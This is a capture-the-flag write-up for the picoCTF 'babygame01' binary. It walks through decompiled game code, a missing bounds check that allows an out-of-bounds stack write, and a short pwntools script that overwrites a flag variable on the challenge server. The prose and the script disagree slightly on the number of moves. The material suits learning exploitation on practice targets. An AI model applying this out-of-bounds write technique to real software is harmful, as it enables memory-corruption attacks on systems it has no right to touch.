# babygame01

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/345) provide us a `game` binary:

```
❯ ./game

Player position: 4 4
End tile position: 29 89
Player has flag: 0
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```


oppening it on ida we get those functions:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+1h] [ebp-AA5h]
  _DWORD v5[2]; // [esp+2h] [ebp-AA4h] BYREF
  char v6; // [esp+Ah] [ebp-A9Ch]
  _BYTE v7[2700]; // [esp+Eh] [ebp-A98h] BYREF
  unsigned int v8; // [esp+A9Ah] [ebp-Ch]
  int *p_argc; // [esp+A9Eh] [ebp-8h]

  p_argc = &argc;
  v8 = __readgsdword(0x14u);
  init_player(v5);
  init_map(v7, v5);
  print_map(v7, v5);
  signal(2, (__sighandler_t)sigint_handler);
  do
  {
    do
    {
      v4 = getchar();
      move_player(v5, v4, v7);
      print_map(v7, v5);
    }
    while ( v5[0] != 29 );
  }
  while ( v5[1] != 89 );
  puts("You win!");
  if ( v6 )
  {
    puts("flage");
    win();
    fflush(stdout);
  }
  return 0;
}
```
```c
_BYTE *__cdecl move_player(int *a1, char a2, int a3)
{
  _BYTE *result; // eax

  if ( a2 == 'l' )
    player_tile = getchar();
  if ( a2 == 'p' )
    solve_round(a3, a1);
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
  switch ( a2 )
  {
    case 'w':
      --*a1;
      break;
    case 's':
      ++*a1;
      break;
    case 'a':
      --a1[1];
      break;
    case 'd':
      ++a1[1];
      break;
  }
  result = (_BYTE *)(a1[1] + a3 + 90 * *a1);
  *result = player_tile;
  return result;
}
```
```c
int __cdecl solve_round(int a1, int *a2)
{
  int result; // eax

  while ( a2[1] != 89 )
  {
    if ( a2[1] > 88 )
      move_player(a2, 97, a1);
    else
      move_player(a2, 100, a1);
    print_map(a1, (int)a2);
  }
  while ( *a2 != 29 )
  {
    if ( a2[1] > 28 )
      move_player(a2, 115, a1);
    else
      move_player(a2, 119, a1);
    print_map(a1, (int)a2);
  }
  sleep(0);
  result = *a2;
  if ( *a2 == 29 )
  {
    result = a2[1];
    if ( result == 89 )
      return puts("You win!");
  }
  return result;
}
```

We can see that on the `move_player` we don't have bounds checking here:
```c
*(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
```
Thanks to this, we can arbitrarily write on the memory.

# Exploitation


We will moove the player to (0,0)
Then, we need to write on `v6`.
Finally, we will just have to set `x` to 29 and `y` to 89 calling `solve_round`.

Our variables are declared like this:

```c
char v4; // [esp+1h] [ebp-AA5h]
_DWORD v5[2]; // [esp+2h] [ebp-AA4h] BYREF
char v6; // [esp+Ah] [ebp-A9Ch]
_BYTE v7[2700]; // [esp+Eh] [ebp-A98h] BYREF
unsigned int v8; // [esp+A9Ah] [ebp-Ch]
int *p_argc; // [esp+A9Eh] [ebp-8h]
```

So our stack looks like this:

```
| [esp+Ah] [ebp-A9Ch]  | v6 (1 byte)      | <-- Target
| [esp+Eh] [ebp-A98h]  | v7[2700] (map)   |
```

In `move_player`, we write on our stack like this:
```c
*(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
```
Once we are on (0,0), each `a` will shifts memory write location by one byte. So if we want to write on v6, we will need to add 4 `a` because v6 and v7 are 4 bytes away.

# Solve.py

```py
from pwn import *


payload = 'w'*4 + 'a' * 8
payload += 'p' # call solve_round()

r = remote('saturn.picoctf.net', 56556)

r.recvuntil(b'..X')
r.sendline(payload.encode())
r.interactive()
```